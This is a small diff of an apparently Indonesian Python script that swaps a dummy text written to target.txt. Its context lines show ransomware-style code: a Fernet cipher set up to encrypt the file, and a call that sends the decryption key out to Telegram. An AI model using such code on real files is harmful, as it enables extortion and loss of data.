@@ -24,7 +24,7 @@ kirim_ke_telegram(f"🔓 KUNCI DEKRIPSI DITEMUKAN!\n\nUser: Kurumii-Kali\nKey: {
 cipher = Fernet(kunci)
 # Pastikan file target.txt ada
 with open("target.txt", "w") as f:
-    f.write("DOKUMEN RAHASIA NEGARA - JANGAN DIBUKA")
+    f.write("DOKUMEN IJAZAH TERMUL - JANGAN DIBUKA")
 
 with open("target.txt", "rb") as f:
     konten = f.read()
